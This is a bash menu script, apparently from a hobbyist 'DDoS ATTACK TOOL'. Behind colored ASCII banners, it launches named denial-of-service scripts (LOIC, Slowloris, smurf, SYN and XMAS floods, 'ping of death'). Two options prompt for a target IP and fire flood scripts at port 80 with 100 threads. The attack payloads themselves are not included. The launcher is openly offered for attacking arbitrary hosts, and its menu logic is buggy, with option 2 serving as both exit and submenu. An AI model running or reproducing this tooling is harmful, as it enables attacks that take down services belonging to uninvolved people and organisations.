
clear
blue='\033[34;1m'
green='\033[32;1m'  
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'                                           
yellow='\033[33;1m'
clear
toilet -f standard "UGH" -F gay
echo
echo $green"=========================================="
echo $red"DDoS ATTACK TOOL  By UGH"
echo $cyan"U                U"
echo $cyan"U                U"
echo $cyan"U                U"
echo $cyan"U                U"
echo $cyan"U                U"
echo $cyan"U                U"
echo $cyan"U                U"
echo $cyan"       UUUU"

echo $blue"    GGGG"
echo $blue"G                G"
echo $blue"G"
echo $blue"G    GGG"
echo $blue"G                G"
echo $blue"G                G"
 echo $blue"   GGGG"

echo $green"H            H"
echo $green"H            H"
echo $green"H            H"
echo $green"HHHHH"
echo $green"H            H"
echo $green"H            H"
echo  $green"H            H"


echo $green"==========================================="
echo $white"                  MENU                     "
echo $green"============================================="
echo $red"[1].DDOS ATTACK.   #UGH"
echo $red"[2].EXIT TOOL.     #UGH"
echo $green"============================================="
echo $white "╭─"$yellow"Pyae Sone Hmoo"
read -p " ╰─> " pil

#DDOS

if [ $pil = 1 ] || [ $pil = 1 ]
then
clear
toilet -f slant "LIST DDOS" -F metal
echo
echo $green"============================================="
echo $yellow"[1].LOIC"
echo $yellow"[2].AMNESIA"
echo $yellow"[3].PING OF DEADHT"
echo $yellow"[4].POF ARMAGEDON LEVEL"
echo $yellow"[5].LORIS"
echo $green"============================================="
echo $white "╭─"$yellow"UHG"
read -p " ╰─> " ddos
fi

if [ $ddos = 1 ] || [ $ddos = 1 ]
then
clear
python2 LO1C.py
fi

if [ $ddos = 2 ] || [ $ddos = 2 ]
then
clear
perl Amnesia.pl
fi

if [ $ddos = 3 ] || [ $ddos = 3 ]
then
clear
python2 TheSploit.py
fi

if [ $ddos = 4 ] || [ $ddos = 4 ]
then
clear
python2 arma.py
fi

if [ $ddos = 5 ] || [ $ddos = 5 ]
then
clear
python2 lor.py
fi


#DOS



if [ $pil = 2 ] || [ $pil = 2 ]
then
clear
toilet -f slant "LIST DOS" -F metal
echo
echo $green"============================================="
echo $yellow"[1].WIN(TERMUX)"
echo $yellow"[2].SUMFR(PC)"
echo $yellow"[3].UFOSYN(PC)"
echo $yellow"[4].XMAS(PC)"
echo $yellow"[5].ANDROMEDA(TERMUX)"
echo $green"============================================="
echo $white "╭─"$yellow"By UGH"
read -p " ╰─> " dos
fi



if [ $dos = 1 ] || [ $dos = 1 ]
then
clear
toilet -f slant "WIN"
echo $red"MASUKAN IP TARGET"
read -p "===>" win
python2 win.32.64.NT.py -s$win -p80 -t100
fi



if [ $dos = 2 ] || [ $dos = 2 ]
then
clear
python2 smurf.py
fi

if [ $dos = 3 ] || [ $dos = 3 ]
then
clear
python2 ufosyn.py
fi

if [ $dos = 4 ] || [ $dos = 4 ]
then
clear
python2 xmas.py
fi

if [ $dos = 5 ] || [ $dos = 5 ]
then
clear
toilet -f slant "DROID RX" |lolcat
echo $red"MASUKAN IP TARGET"
read -p "===>" ipt
clear
echo
python2 andromeda.py -s$ipt -p80 -t100
fi



#exit

if [ $pil = 2] || [ pil = 2 ]
then
clear
exit
fi
